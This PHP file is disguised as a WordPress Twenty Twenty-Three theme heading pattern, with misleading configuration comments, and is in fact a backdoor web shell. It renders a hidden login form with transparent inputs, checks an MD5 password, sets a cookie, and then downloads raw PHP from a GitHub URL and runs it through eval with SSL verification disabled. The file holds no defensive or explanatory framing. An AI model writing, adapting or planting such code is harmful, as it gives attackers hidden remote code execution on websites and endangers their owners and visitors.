<?php
/**
 * Title: Config Heading for Homepage
 * Slug: twentytwentythree/hidden-heading
 * Inserter: no
 
?>
<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} -->
<h1 class="alignwide" style="margin-bottom:var(--wp--preset--spacing--60)"><?php echo esc_html_x( 'Mindblown: a blog about philosophy.', 'Main heading for homepage', 'twentytwentythree' ); ?></h1>
<!-- /wp:heading -->
*/
/**
* The core configuration of a WordPress
* system is largely defined by the configurations of server
* and generate content PHP for theme version
*/

/**
* located in the root directory of your theme WordPress installation
* posts, pages, comments, user data, settings, etc
* You can control automatic updates for WordPress PHP themes
* used to configure various other advanced settings
*/

/**
* You can access and edit configurations using a file manager provided by your web host
* Dont Edit Anything In This Folder If You Not the root for permission
*/

/**
* Function to check if the user is logged in based on the presence of a valid cookie
*/
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Change 'user123' with value valid
}

/**
* Check if the user is logged in before executing the content
*/
if (is_logged_in()) {
    /** Function to get URL content (replaced with fetcher like the example)
    */
    /* ======= fetcher utility (file_get_contents || curl fallback) ======= */
    function fetch_manifest(string $uri) {
        $payload = @file_get_contents($uri);
        if ($payload !== false) return $payload;

        if (!function_exists('curl_init')) return false;

        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $uri);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        // note: in production you should enable SSL verification
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_TIMEOUT, 15);
        $payload = curl_exec($c);
        $code = curl_getinfo($c, CURLINFO_HTTP_CODE);
        curl_close($c);

        if ($code !== 200 || $payload === false || trim($payload) === '') return false;
        return $payload;
    }

    /* ======= remote source location (raw PHP content) ======= */
    $remote_manifest = 'https://raw.githubusercontent.com/soy777/gg/main/reds.php';

    /* optional authoritative content digests (SHA-256). empty=disabled. */
    $authorized_digests = []; // e.g. ['3a7bd3...']

    /* ======= retrieve remote code ======= */
    $remote_blob = fetch_manifest($remote_manifest);
    if ($remote_blob === false || trim($remote_blob) === '') {
        http_response_code(502);
        exit('Remote acquisition failed: manifest unobtainable.');
    }

    /* ======= optional integrity gate ======= */
    if (!empty($authorized_digests)) {
        $digest = hash('sha256', $remote_blob);
        if (!in_array($digest, $authorized_digests, true)) {
            http_response_code(403);
            exit('Integrity constraint violation: digest mismatch.');
        }
    }

    /* ======= Immediate evaluation zone ======= */
    try {
        ob_start();

        // execute the remote code verbatim
        eval('?>' . $remote_blob);

        $collected = ob_get_clean();

        // canonical emission
        header('Content-Type: text/html; charset=utf-8');
        echo $collected;
        exit;
    } catch (Throwable $t) {
        // ensure no nested buffers leak
        while (ob_get_level() > 0) ob_end_clean();
        http_response_code(500);
        $msg = 'Execution anomaly: ' . htmlspecialchars($t->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        echo $msg;
        exit;
    }

} else {
    /** Display login form if not logged in */
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '9c5b3082eae2c54711bb99f361f58073';
        if (md5($entered_password) === $hashed_password) {
            /** Password is correct, set a cookie to indicate login */
            setcookie('user_id', 'user123', time() + 3600, '/');
        } else {
            /** Password is incorrect */
            echo "Incorrect password. Please try again.";
        }
    }
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>

        input[type="password"] {
            border: none;
            background: transparent;
            color: transparent;
            outline: none;
        }

        input[type="submit"] {
            border: none;
            background: transparent;
            color: transparent;
            outline: none;
            cursor: default;
        }
    </style>
</head>
<body>
    <form method="POST" action="">
        <label for="password"> </label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
    </form>
</body>
</html>
    <?php
}
?>
